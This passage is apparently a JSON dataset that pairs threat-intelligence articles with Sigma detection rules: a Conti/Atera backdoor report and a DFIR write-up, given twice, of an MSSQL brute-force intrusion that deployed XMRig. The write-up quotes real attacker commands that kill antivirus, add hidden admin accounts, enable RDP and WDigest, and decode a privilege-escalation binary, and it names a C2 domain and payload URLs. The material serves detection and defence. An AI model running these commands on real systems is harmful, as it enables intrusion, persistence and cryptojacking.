          "id": "46a68649-f218-4f86-aea1-16a759d81820",
          "type": "derived"
        },
        {
          "id": "a33f8808-2812-4373-ae95-8cfb82134978",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects write access requests to the Windows Defender exclusions registry keys. This could be an indication of an attacker trying to request a handle or access the object to write new exclusions in order to bypass security.\n",
      "references": [
        "https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/"
      ],
      "author": "@BarryShooshooga, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2019-10-26",
      "modified": "2023-11-11",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "Requirements: Audit Policy : Security Settings/Local Policies/Audit Policy, Registry System Access Control (SACL): Auditing/User"
      },
      "detection": {
        "selection": {
          "AccessList|contains": [
            "%%4417",
            "%%4418"
          ],
          "EventID": [
            4656,
            4663
          ],
          "ObjectName|contains": "\\Microsoft\\Windows Defender\\Exclusions\\"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_windows_defender_exclusions_write_access.yml",
    "id": "794"
  },
  {
    "url": "https://web.archive.org/web/20230208191147/https://www.advintel.io/post/secret-backdoor-behind-conti-ransomware-operation-introducing-atera-agent",
    "markdown": "# Secret \"Backdoor\" Behind Conti Ransomware Operation: Introducing Atera Agent\n\n*Updated: Oct 7, 2021*\n*Published: Aug 11, 2021*\n\n---\n\nThis report is based on our actual proactive victim breach intelligence and subsequent incident response (not a simulated or sandbox environment) identified via unique high-value collections at AdvIntel.\n\n```image\nAlt: Conti Ransomware Operation\nDescription: The image features a combination of a portrait photograph of an individual alongside textual content discussing the Atera Agent's role in the Conti ransomware operation. The text highlights how the Atera Agent enabled the Conti gang to maintain persistent access to compromised environments that had robust machine learning-based detection and response antivirus solutions. Additionally, the image incorporates graphical elements, including quotes and design features that enhance its visual appeal.\nTranscription: |\n  The Atera Agent allowed the Conti gang to regain persistent access to infected protected environments, especially environments that were equipped with more aggressive machine learning endpoint detection and response anti-virus products.\n```\n\n---\n\n### Adversary Tactics Chain Flow:\n\n1. Conti Access via TrickBot, Buer, BazarBackdoor, AnchorDNS\n2. Cobalt Strike beacon\n3. Atera Agent Installation\n4. Persistence & Shell Execution to Survive Cobalt Strike detections\n\n```image\nAlt: Adversary Tactics Chain\nDescription: The image depicts a flowchart detailing the adversary tactics involved in the Conti ransomware operation utilizing the Atera Agent. It outlines six steps in the process: 1) Initiation of access through various malware (TrickBot, Buer, BazarBackdoor, AnchorDNS), 2) Use of a Cobalt Strike beacon to investigate and infiltrate the network, 3) Conti exploiting a registration loophole to obtain trial access to Atera, 4) Installation of the Atera Agent, 5) Enabling of persistence and shell execution to evade Cobalt Strike detections, and 6) Execution of the Conti ransomware attack. The background includes a circuit board design, reinforcing the technical theme.\nTranscription: |\n  Conti Weaponizing Atera Agent\n  \n  Step 1 - Initiation\n  Conti Access via TrickBot, Buer, BazarBackdoor, AnchorDNS\n  \n  Step 2 - CS Beacon\n  Cobalt Strike beacon to investigate & infiltrate the network\n  \n  Step 3 - Atera\n  Conti uses registration loophole to obtain Atera trial access\n  \n  Step 4 - Installation\n  Atera Agent Installation\n  \n  Step 5 - Persistence\n  Atera Agent enables Persistence & Shell Execution to Survive Cobalt Strike detections\n  \n  Step 6 - Execution\n  Conti Ransomware Attack\n```\n\n---\n\n### What is Atera?\n\nAtera is an **IT management solution that enables monitoring, management, and automation of hundreds of SMB IT networks** from a single console. Atera includes a remote control, patch management, discovery, inventory of IT assets, monitoring, security, backup, and more.\n\n```image\nAlt: Atera Agent\nDescription: The image depicts a screenshot of a tweet from Vitali Kremez (@VK_Intel), issuing a warning regarding unauthorized installations of the Atera Agent and AnyDesk persistence. It highlights that Conti adversaries use legitimate AteraCloud RMM agents with temporary accounts to evade detection by Cobalt Strike. The tweet includes a timestamp and a reference to a BleepingComputer article related to Conti ransomware operations.\nTranscription: |\n  Warning!\n  🔍 Scan for unauthorized Atera Agent installations and Any Desk persistence.\n  🚨 The #Conti adversaries install legit @AteraCloud RMM agent w/ one-day burner accounts to survive Cobalt Strike detects.\n  I confirm as we see Atera along Cobalt installations pre-ransomware.\n  \n  BleepingComputer @BleepinComputer · Aug 5\n  Angry Conti ransomware affiliate leaks gang's attack playbook - @LawrenceAbrams\n  bleepingcomputer.com/news/security/…\n  Show this thread\n  \n  4:51 PM · Aug 5, 2021 · Twitter for Android\n```\n\n---\n\n### Deploying Atera Agent as \"Backdoor\"\n\nThe idea behind this tactic is leveraging a legitimate remote management agent, Atera, to survive possible Cobalt Strike detections from the endpoint detection and response platform. Relying on the legitimate tool to achieve persistence is a core idea leveraged by the ransomware pentesting team.\n\nWhile reviewing Conti incidents that we proactively identified, monitored, and alerted via our threat prevention platform Andariel, AdvIntel has identified that Atera played a key role in allowing secret backdoor installations on the host right after the Conti gang obtained initial access via TrickBot, BazarBackdoor, AnchorDNS, or Cobalt Strike directly.\n\n---\n\n### Conti Operational Handbook: Atera as Backdoor\n\nThe **disgruntled Conti operator** leaked the tactics matching our proactive cases.\n\n```image\nAlt: Conti Operator Leak\nDescription: The image displays a section of text in Russian, providing instructions on how to install the Atera agent, which is associated with the Conti ransomware operation. It outlines the steps including visiting a specific website, downloading the agent, and executing an installation command. Key terms such as \"Install agent\" and \"Devices\" are highlighted, indicating the operational procedure for utilizing Atera as a backdoor.\nTranscription: |\n  11.2. Закреп Atera\n  Сайт https://app.atera.com\n  Регистрируемся\n  Сверху нажимаем Install agent\n  Скачиваем агент и закидываем его на бота\n  Запускаем агент:\n  shell УСТАНОВЩИК АГЕНТА.msi\n  На сайте в разделе Devices должен появиться доступ\n  Удаляем установщик агента\n```\n\n---\n\n### Atera Agent \"Backdoor\" Relevancy\n\nThe Atera agent allows the following connection options for ransomware groups to achieve persistence:\n\n- Splashtop\n- AnyDesk\n- TeamViewer\n- ScreenConnect\n\nAdditionally, the agent allows direct command-prompt and PowerShell shell execution into the agent-installed environment.\n\n---\n\n### Operational Insight\n\nThe Atera Agent allowed the Conti gang to regain access to infected protected environments, especially environments that were equipped with more aggressive machine learning endpoint detection-and-response anti-virus products.\n\nThe benefit is obvious - once Conti receives the desired access to the trial version of Atera with the burner account, they obtain a shell and backdoor access to the environment maintained by a legitimate software tool.\n\n> We assess with high confidence the theme of leveraging tooling around legitimate and trusted software as a backdoor will continue to be the tactics leveraged by the ransomware pentester groups based on their latest tactics.\n\n---\n\n### Mitigation\n\nAudit and/or block command-line interpreters by using whitelisting tools, like AppLocker or Software Restriction Policies with the focus on any suspicious “curl” command and unauthorized “.msi” installer scripts, particularly those from `C:\\ProgramData` and `C:\\Temp` directory.\n\n---\n\n### Detection Methods\n\nCommand-line interface activities can be captured through proper logging of process execution with command-line arguments.\n\n---\n\n### Reference\n\n- Tactic: T1059 Command and Scripting Interpreter\n- Tactic: T1127 Trusted Developer Utilities Proxy Execution",
    "sigma_rule": {
      "title": "Atera Agent Installation",
      "id": "87261fb2-69d0-42fe-b9de-88c6b5f65a43",
      "status": "test",
      "description": "Detects successful installation of Atera Remote Monitoring & Management (RMM) agent as recently found to be used by Conti operators",
      "references": [
        "https://web.archive.org/web/20230208191147/https://www.advintel.io/post/secret-backdoor-behind-conti-ransomware-operation-introducing-atera-agent"
      ],
      "author": "Bhabesh Raj",
      "date": "2021-09-01",
      "modified": "2022-12-25",
      "tags": [
        "attack.t1219"
      ],
      "logsource": {
        "service": "application",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "EventID": 1033,
          "Provider_Name": "MsiInstaller",
          "Message|contains": "AteraAgent"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate Atera agent installation"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\application\\msiinstaller\\win_software_atera_rmm_agent_install.yml",
    "id": "804"
  },
  {
    "url": "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/",
    "markdown": "# SELECT XMRig FROM SQLServer\n\n**Categories:** coinminer, exploit \n**Published Date:** July 11, 2022 \n\n---\n\nIn March 2022, we observed an intrusion on a public-facing Microsoft SQL Server. The end goal of this intrusion was to deploy a coin miner. Although deploying a coin miner on a vulnerable server after successful exploitation is a common objective for threat actors, this intrusion was slightly different and therefore more interesting.\n\nUS CERT recently published a malware analysis report related to XMRig coin miner on 23rd June 2022 (link) and a security tip for defending against this threat (link).\n\n---\n\n## Summary\n\nOver the month of March, we observed a cluster of activity targeting MSSQL servers. The activity started via password brute force attempts for the MSSQL SA account. These brute force attempts were observed repeatedly over the month. Examples included one cluster of 24,000 failed attempts from the same source, over a 27-hour effort, before they finally managed to guess the password. After obtaining the correct credentials, the attackers spawned a command shell via `xp_cmdshell`. According to Microsoft documentation, `xp_cmdshell` spawns a Windows command shell and passes in a string for execution.\n\nUsing `xp_cmdshell`, the threat actors were able to execute any command against the compromised server. They attempted to kill a bunch of AV programs by using `taskkill.exe`. The threat actors then wrote multiple commands to a batch file by using `echo` and redirecting the strings to a file named `1.bat`. After the batch file was written, they proceeded to perform the same action echoing data into a file named `bigfile.txt`. After finishing writing to that file, they ran `certutil` to decode the base64 data into an executable file. This executable was a privilege escalation tool used to execute the batch file to ensure it executed with high enough permissions. They then executed the batch script. The commands included adding new users to the local administrators group, enabling RDP, enabling WDigest, and hiding the newly created admin accounts using the registry.\n\nOnce the threat actors had established persistence on the compromised host, they moved to their final objective, which was to install and run the XMRig miner. They dropped a Binary Managed Object Format (BMOF) file along with the miner itself to achieve this. The threat actors used `mofcomp.exe` to decompile the BMOF binary and register a malicious class in the WMI repository. The event consumer of the newly created classes included a VBE script responsible for setting up and executing the XMRig miner with the correct settings.\n\nNo other activity beyond the mining was observed before the threat actors were evicted.\n\n---\n\n## Services\n\nWe offer multiple services, including a Threat Feed service that tracks Command and Control frameworks such as Cobalt Strike, Sliver, BumbleBee, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here.\n\nArtifacts for this case are limited due to the environment. A few log sources are available for this case under our Security Researcher and Organization services.\n\n---\n\n## Initial Access\n\nThe initial access took place via a brute-force attack, where the threat actors mainly targeted the System Admin (SA) account.\n\nDuring the intrusions, we could see SQL Server event ID **18456** Failure Audit Events in the Windows application logs. We witnessed more than 24,000 attempts from the same source before the threat actors successfully guessed the username and password for the open SQL database.\n\n### Example of the failed brute force attempts:\n\n```image\nAlt: Failed Attempts\nDescription: The image displays a series of failed login attempts to a SQL Server, showing usernames and the corresponding reasons for failure. Each entry indicates whether the password did not match or the login could not be found. The usernames include common administrative names like 'sa' and 'admin,' highlighting potential brute force attack attempts.\nTranscription: |\n  sa | Reason: Password did not match that for the login provided. |\n  hbv7 | Reason: Could not find a login matching the name provided. |\n  su | Reason: Could not find a login matching the name provided. |\n  ps | Reason: Could not find a login matching the name provided. |\n  vice | Reason: Could not find a login matching the name provided. |\n  kisadmin | Reason: Could not find a login matching the name provided. |\n  401hk | Reason: Could not find a login matching the name provided. |\n  sysdba | Reason: Could not find a login matching the name provided. |\n  admin | Reason: Password did not match that for the login provided. |\n  uep | Reason: Could not find a login matching the name provided. |\n  bizbox | Reason: Could not find a login matching the name provided. |\n  neterp | Reason: Could not find a login matching the name provided. |\n  unierp | Reason: Could not find a login matching the name provided. |\n  sp | Reason: Could not find a login matching the name provided. |\n  root | Reason: Password did not match that for the login provided. |\n  bwsa | Reason: Could not find a login matching the name provided. |\n```\n\n### Followed by eventual successful logins:\n\n```image\nAlt: Successful Logins\nDescription: The image depicts a table displaying SQL Server audit events. It includes columns such as 'TimeWritten,' 'EventID,' 'EventTypeName,' 'EventCategory,' 'SourceName,' and 'Strings,' showing multiple entries for successful audit events. The entries indicate the timestamps of the events, the event type as 'Success Audit event,' and the source name as 'MSSQL$SQLEXPRESS,' suggesting automated access attempts by the threat actor.\nTranscription: |\n  | TimeWritten      | EventID | EventT | EventTypeName       | EventC | SourceName       | Strings       |\n  | ---------------- | ------- | ------ | ------------------- | ------ | ---------------- | ------------- |\n  | 2022-11-01 11:00 | 18454   | 8      | Success Audit event | 4      | MSSQL$SQLEXPRESS | sa | [CLIENT: |\n  | 2022-11-01 11:00 | 18454   | 8      | Success Audit event | 4      | MSSQL$SQLEXPRESS | sa | [CLIENT: |\n  | 2022-11-01 11:01 | 18454   | 8      | Success Audit event | 4      | MSSQL$SQLEXPRESS | sa | [CLIENT: |\n```\n\nIt is likely that multiple successful logins were observed due to the automated access script that the threat actor was using.\n\n---\n\n## Execution\n\nIn the next attack stage, the threat actors established a cmd shell via Extended SQL Stored Procedure (`xp_cmdshell`). This process allows you to issue operating system commands directly to the Windows command shell using T-SQL code.\n\n### Example of command execution following a successful authentication to SQL database using `xp_cmdshell`:\n\n```\nEXEC xp_cmdshell 'whoami'\n```\n\nAt a high level, the overall execution events can be depicted in the below diagram:\n\n```image\nAlt: Execution Diagram\nDescription: The image is a flow diagram illustrating the execution events following a successful brute-force attack against a SQL Server. It details the steps from authentication via brute force, the use of the command shell via `xp_cmdshell`, writing various scripts and files to disk, compiling a MOF file, and killing antivirus processes. The diagram includes visual elements like boxes and arrows showing the progression of actions taken by threat actors, such as adding local administrator accounts and setting up a scheduled task for running XMRig CoinMiner.\nTranscription: |\n  START\n    Brute-Force Attack Against SQL Server\n      Successful Authentication via Brute Force Attack\n        Command Shell via xp_cmdshell\n          Writes 1.bat, and bigfile.txt to disk\n            decodes bigfile.txt with certutil into bigfile.exe\n              bigfile.exe used to run 1.bat\n                1.bat performs the following\n                  Adding Local Administrator Accounts\n                  Hiding New Local Admin Accounts\n                  Enables RDP\n                  Enables Widget\n          Writes kit.bat to disk\n            Running XMRig CoinMiner\n              Creating scheduled task for CoinMiner\n      Compiling BMOF file\n        Adding a new class/ MyASEventConsumer in WMI repository\n          EventConsumer (Script or executable to run)\n            Creates persistence\n            Download/executes VBE script\n              - Random Name\n              - Executes every day at 23:00\n          EventFilter (Trigger condition)\n          Binding (Tie together Filter + Consumer)\n    Kills AV Processes\n```\n\nIf we look into the Windows Application logs, specifically, the SQL Server event ID 15457 captures this as an `xp_cmdshell` event. Additionally, the SQL Server audit collection also captures similar events. The first commands executed by the threat actors included using `taskkill` for various anti-virus software.\n\n### Commands to kill AV processes:\n\n```\ntaskkill /f /im egui.exe\ntaskkill /f /im QQPCTray.exe\ntaskkill /f /im SafeDogGuardCenter.exe\ntaskkill /f /im 360safe.exe\ntaskkill /f /im net1895.exe\ntaskkill /f /im ekrn.exe\ntaskkill /f /im 360rp.exe\ntaskkill /f /im QQPCMgr.exe\ntaskkill /f /im SafeDogServerUI.exe\ntaskkill /f /im SafeDogSiteIIS.exe\n```\n\nThe threat actors also favored the execution of batch scripts on the compromised host. They used `xp_cmdshell` to write a batch script (`1.bat`) to disk by redirecting strings to the file using `echo` commands.\n\n```image\nAlt: Batch Script Creation\nDescription: The image displays a table detailing a process execution log from a cybersecurity incident. It includes columns for 'Initiating Process File Name', 'Action Type', 'Initiating Process Command Line', 'Initiating Process Account Name', and 'File Name'. The table shows that 'cmd.exe' initiated a file creation action, specifically creating a batch file named '1.bat'. The command line executed involves various administrative commands, such as adding a user to local groups and modifying registry entries.\nTranscription: |\n  | Initiating Process File Name | Action Type | Initiating Process Command Line| Initiating Process Account Name | File Name |\n  | ---------------------------- | ----------- || ------------------------------- | --------- |\n  | cmd.exe                      | FileCreated | \"cmd.exe\" /c (echo NET USER Admin\\$ !67hC5140Rvg /ADD /expires:never & echo NET LOCALGROUP Administrators /ADD Admin\\$ & REG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v SpecialAccounts\\Userlist /t REG_DWORD /d 0 & echo reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\" /v UseLogonCredential /t REG_DWORD /d 1 /f & echo reg add \"HKLM\\LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v UserAuthentication /t REG_DWORD /d 0 /f & echo reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-TCP\" /v UserAuthentication /t REG_DWORD /d 0 /f & echo NET LOCALGROUP Administrators /ADD Admin\\$ & echo NET LOCALGROUP Administrators /ADD Admin\\$ > %USERPROFILE%\\AppData\\1.bat | mssql$sqlexpress                | 1.bat     |\n```\n\nA second set of commands was also echoed into a file named `bigfile.txt`. Once complete, `certutil` was used to decode the text and create an executable file.\n\n### Certutil command:\n\n```\ncmd.exe /c certutil -decode %USERPROFILE%\\AppData\\bigfile.txt %USERPROFILE%\\AppData\\bigfile.exe\n```\n\nThis executable was then used in executing the `1.bat` batch file.\n\n### Command to execute batch file:\n\n```\ncmd.exe /c %USERPROFILE%\\AppData\\bigfile.exe -i -c %USERPROFILE%\\AppData\\1.bat\n```\n\nPulling the hash of the file that was written matches what appears to be a privilege escalation tool as seen in the hits from THOR scanner: \nhttps://www.virustotal.com/gui/file/b67dfd4a818d10a017a4d32386cf4cd2a3974636bed04f27e45de6ada86a56d2/community\n\n```image\nAlt: THOR Scanner\nDescription: The image displays a screenshot from the THOR APT Scanner, detailing YARA signature matches for various hacking tools and indicators. It includes specific rules like 'Hacktool_Inject_Incognito' and 'Hacktool_Privilege_Escalation_Jan22_1,' with links to their descriptions and detection information. Detection timestamps and AV detection rates (e.g., 8/67) are also provided, indicating the effectiveness of the rules in identifying malicious activity.\nTranscription: |\n  thor\n  1 month ago\n  \n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: Hacktool_Inject_Incognito\n  RULE_SET: Livehunt - Hacktools Indicators ⚔️\n  RULE_TYPE: VALHALLA rule feed only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/Hacktool_Inject_Incognito\n  DESCRIPTION: Detects hacktool incognito\n  RULE_AUTHOR: Florian Roth\n  \n  Detection Timestamp: 2022-06-07 23:44\n  AV Detection Ratio: 6 / 67\n  \n  Use these tags to search for similar matches: #hacktool #incognito #hacktool_inject_incognito\n  More information: https://www.nextron-systems.com/notes-on-virustotal-matches/\n  \n  ---\n  \n  thor\n  1 month ago\n  \n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: Hacktool_Incognito_av\n  RULE_SET: Livehunt - Hacktools Indicators ⚔️\n  RULE_TYPE: VALHALLA rule feed only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/Hacktool_Incognito_av\n  DESCRIPTION: Detects Hacktool Incognito Av\n  REFERENCE: https://www.virustotal.com/en/file/18e64d4c240f6481e7bd542f6c8acc802549d437ec0018e10a3b0b6f675d/analysis/\n  RULE_AUTHOR: Florian Roth\n  \n  Detection Timestamp: 2022-06-07 23:44\n  AV Detection Ratio: 8 / 67\n  \n  Use these tags to search for similar matches: #hacktool #incognito #hacktool_incognito_av\n  More information: https://www.nextron-systems.com/notes-on-virustotal-matches/\n  \n  ---\n  \n  thor\n  1 month ago\n  \n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: HKTK_Inject_Privilege_Escalation_Jan22_1\n  RULE_SET: Livehunt - Hacktools Indicators ⚔️\n  RULE_TYPE: VALHALLA rule feed only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/HKTK_Inject_Privilege_Escalation_Jan22_1\n  DESCRIPTION: Detects a hacktool that seems to provide privilege escalation vectors\n  RULE_AUTHOR: Florian Roth\n  \n  👋 Hey, this seems to be an open-source tool or framework. The author has shared it with the community with the intention to improve overall security. If you are a victim and noticed this tool in a breach, please visit the tool's github page (see above) and tell your story by creating an issue on the issues page: https://github.com/KaLendis/CVE-2022-21882/issues ❤️.\n  \n  Detection Timestamp: 2022-06-07 23:44\n  AV Detection Ratio: 6 / 67\n```\n\nWe believe this tool may be a variation of NetworkServiceExploit.exe, which attempts to use NetworkService for privilege escalation.\n\n---\n\n## Persistence\n\nThe threat actors wrote a batch script (`1.bat`) that contained commands for establishing persistence on the compromised host. We see the creation of a new account and adding this account to the local administrators group.\n\n### Commands to create and add user:\n```\nNET USER Adminv$ !67hCS14ORVg /ADD /expires:never\nNET LOCALGROUP Administrators /ADD Adminv$\n```\n\nThey also made remote RDP connections possible by changing the `fDenyTSConnections` and `UserAuthentication` values to `0`.\n\n### Commands to enable RDP:\n```\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-TCP\" /v UserAuthentication /t REG_DWORD /d \"0\" /f\n```\n\nThe full contents of `1.bat` also included commands to hide the user account by adding it to the registry using \"Special Accounts\".\n\n### Command to hide user account:\n```\nREG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v Adminv$ /t REG_DWORD /d 0\n```\n\n---\n\n## Credential Access\n\nDuring the initial access, credentials were obtained via a brute-force attack against the exposed MSSQL server. No other credential access was observed during this intrusion, although the threat actors did enable WDigest to make later credential access easier.\n\n---\n\n## Command and Control\n\nWe observed that the domain `mymst007[.]info` is used to download further payloads. The domain was created five years ago. We have seen similar reports that make mention of the same infrastructure. Attacks associated with this domain include the same or similar tactics techniques and procedures (TTPs).\n\n```image\nAlt: Connections\nDescription: The image is a detailed diagram illustrating the connections and communications related to the domain 'mymst007.info'. It includes nodes representing contacted IPs, domains, downloaded files, and URLs, along with specific filenames such as 'CSRSS.exe' and 'weixin.html'. The diagram visually maps out the relationships and interactions between these elements, highlighting the command and control infrastructure associated with the observed cyber attacks.\nTranscription: |\n  - Resolutions\n    - mst.mymst007.info\n    - mst2.mymst007.info\n  - Siblings\n  - Contacted ips\n  - Contacted domains\n  - Communicating files\n  - Downloaded files\n    - weixin.html\n  - Referrer files\n    - 3f14dc75982f1abd67e66623c5c8277b8d109be96b6f8fef92e4c0be7b2c9b1\n    - wrmi-instance-script.txt (1e4fdd4670ddb98286ed18bb3940c812215b2e5bda0886589e397667000391f)\n    - 563d381d5f8c7fecc6bd8e228cdf8beccab81fe5b1cfb29ddc34dc779e70e1\n    - 1c496854a393f70196745be19e47d758d50df22e2ed3c247a2008576105f\n  - Contacted urls\n    - http://mst2.mymst007.info/\n    - http://mst2.mymst007.info:4000/ver\n    - http://mst.mymst007.info/\n    - http://mst.mymst007.info:8080/all.dll.asp\n    - http://mst.mymst007.info/perp2017/home2/pergavr2017/a.exe\n  - CSRSS.exe\n```\n\n---\n\n## Impact\n\nThe impact was concentrated on this one host. We did not see any further activity in this case. The compromised host had XMRig miner installed and running. The miner was also connecting to cryptomining pools such as `minergate[.]com`.\n\n---\n\n## Indicators\n\n### File\n\n```\nWinRing0x64.sys\n0c0195c48b6b8582fa6f6373032118da\nd25340ae8e92a6d29f599fef426a2bc1b5217299\n11bd2c9f9e2397c9a16e0990e4ed2cf0679498fe0fd418a3dfdac60b5c160ee5\n\nex.exe\na7bafac5ed29a68e0fff6eecc3f5bb3f\n4f19b6970e35b3d20f84a91e3af0d82c68096710\n428d06c889b17d5f95f9df952fc13b1cdd8ef520c51e2abff2f9192aa78a4b24\n\nkit.bat\n91931a2b1ae645004023e1b35fe57314\n9f5a7a293c92ef42374cf1471b653ed994446c15\n4905b7776810dc60e710af96a7e54420aaa15467ef5909b260d9a9bc46911186\n\nsmss.exe\ne579cd176b384b38eda6a0c61c51c274\n8a3b31ac12d9ac1a44707b1de75b8870189db83a\nd3c3f529a09203a839b41cd461cc561494b432d810041d71d41a66ee7d285d69\n\nxit\n88fba011db6e5122f4aa2c0343e11275\na2d34aeee2fb7c1ba57a11c03cc33e76f1217548\ncfa12bb31d58d30875b7a20ed05b5c100032b6a18802fbdf3913e70288e11a55\n\nxitmf\n0c8622c4871541e89d0173d5be0db8aa\nb01a88df39857417233d9bd3256f82d0fdcc63f8\nbeda317d74b8f1090e251205064e686d330a0502006a54dc94d528d6bd16c416\n```\n\n### Network\n\n```\nminergate[.]com\nmymst007[.]info\nbj87670@gmail.com\n```\n\n---\n\n## Detections\n\n### Sigma Rules\n\n- Suspicious Commands by SQL Server\n- MOFComp Execution\n- Hiding Local User Accounts\n\n### Yara Rules\n\n```\nrule miner_batch {\n   meta:\n      description = \"file kit.bat\"\n      author = \"TheDFIRReport\"\n      reference = \"https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/\"\n      date = \"2022/07/10\"\n      hash1 = \"4905b7776810dc60e710af96a7e54420aaa15467ef5909b260d9a9bc46911186\"\n   strings:\n      $a1 = \"%~dps0\" fullword ascii\n      $a2 = \"set app\" fullword ascii\n      $a3 = \"cd /d \\\"%~dps0\\\"\" fullword ascii\n      $a4 = \"set usr=jood\" fullword ascii\n      $s1 = \"schtasks /run\" fullword ascii\n      $s2 = \"schtasks /delete\" fullword ascii\n      $a5 = \"if \\\"%1\\\"==\\\"-s\\\" (\" fullword ascii\n   condition:\n      uint16(0) == 0xfeff and filesize < 1KB and\n      3 of ($a*) and 1 of ($s*)\n}\n```\n\n---\n\n## MITRE Techniques\n\n```\nT1053.005 - Scheduled Task/Job: Scheduled Task\nT1136.001 - Create Account: Local Account\nT1546.003 - Event Triggered Execution: Windows Management Instrumentation Event Subscription\nT1564.002 - Hide Artifacts: Hidden Users\nT1059.003 - Command and Scripting Interpreter: Windows Command Shell\nT1027.004 - Obfuscated Files or Information: Compile After Delivery\nT1110.001 - Brute Force: Password Guessing\nT1070.004 - Indicator Removal on Host: File Deletion\nT1562.001 – Impair Defenses: Disable or Modify Tools\nT1546.012 - Event Triggered Execution: Image File Execution Options Injection\nT1140 - Deobfuscate/Decode Files or Information\nT1112 - Modify Registry\nT1078 - Valid Accounts\nT1134.001 - Token Impersonation/Theft\n```",
    "sigma_rule": {
      "title": "MSSQL XPCmdshell Suspicious Execution",
      "id": "7f103213-a04e-4d59-8261-213dddf22314",
      "status": "test",
      "description": "Detects when the MSSQL \"xp_cmdshell\" stored procedure is used to execute commands",
      "references": [
        "https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/",
        "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-12",
      "modified": "2024-06-26",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "product": "windows",
        "service": "application",
        "definition": "Requirements: MSSQL audit policy to monitor for \"xp_cmdshell\" must be enabled in order to receive this event in the application log (Follow this tutorial https://dba.stackexchange.com/questions/103183/is-there-any-way-to-monitor-execution-of-xp-cmdshell-in-sql-server-2012)"
      },
      "detection": {
        "selection": {
          "Provider_Name|contains": "MSSQL",
          "EventID": 33205,
          "Data|contains|all": [
            "object_name:xp_cmdshell",
            "statement:EXEC"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\application\\mssqlserver\\win_mssql_xp_cmdshell_audit_log.yml",
    "id": "806"
  },
  {
    "url": "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/",
    "markdown": "# SELECT XMRig FROM SQLServer\n\n**Categories:** coinminer, exploit \n**Published Date:** July 11, 2022 \n\n---\n\nIn March 2022, we observed an intrusion on a public-facing Microsoft SQL Server. The end goal of this intrusion was to deploy a coin miner. Although deploying a coin miner on a vulnerable server after successful exploitation is a common objective for threat actors, this intrusion was slightly different and therefore more interesting.\n\nUS CERT recently published a malware analysis report related to XMRig coin miner on 23rd June 2022 (link) and a security tip for defending against this threat (link).\n\n---\n\n## Summary\n\nOver the month of March, we observed a cluster of activity targeting MSSQL servers. The activity started via password brute force attempts for the MSSQL SA account. These brute force attempts were observed repeatedly over the month. Examples included one cluster of 24,000 failed attempts from the same source, over a 27-hour effort, before they finally managed to guess the password. After obtaining the correct credentials, the attackers spawned a command shell via `xp_cmdshell`. According to Microsoft documentation, `xp_cmdshell` spawns a Windows command shell and passes in a string for execution.\n\nUsing `xp_cmdshell`, the threat actors were able to execute any command against the compromised server. They attempted to kill a bunch of AV programs by using `taskkill.exe`. The threat actors then wrote multiple commands to a batch file by using `echo` and redirecting the strings to a file named `1.bat`. After the batch file was written, they proceeded to perform the same action echoing data into a file named `bigfile.txt`. After finishing writing to that file, they ran `certutil` to decode the base64 data into an executable file. This executable was a privilege escalation tool used to execute the batch file to ensure it executed with high enough permissions. They then executed the batch script. The commands included adding new users to the local administrators group, enabling RDP, enabling WDigest, and hiding the newly created admin accounts using the registry.\n\nOnce the threat actors had established persistence on the compromised host, they moved to their final objective, which was to install and run the XMRig miner. They dropped a Binary Managed Object Format (BMOF) file along with the miner itself to achieve this. The threat actors used `mofcomp.exe` to decompile the BMOF binary and register a malicious class in the WMI repository. The event consumer of the newly created classes included a VBE script responsible for setting up and executing the XMRig miner with the correct settings.\n\nNo other activity beyond the mining was observed before the threat actors were evicted.\n\n---\n\n## Services\n\nWe offer multiple services, including a Threat Feed service that tracks Command and Control frameworks such as Cobalt Strike, Sliver, BumbleBee, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here.\n\nArtifacts for this case are limited due to the environment. A few log sources are available for this case under our Security Researcher and Organization services.\n\n---\n\n## Initial Access\n\nThe initial access took place via a brute-force attack, where the threat actors mainly targeted the System Admin (SA) account.\n\nDuring the intrusions, we could see SQL Server event ID **18456** Failure Audit Events in the Windows application logs. We witnessed more than 24,000 attempts from the same source before the threat actors successfully guessed the username and password for the open SQL database.\n\n### Example of the failed brute force 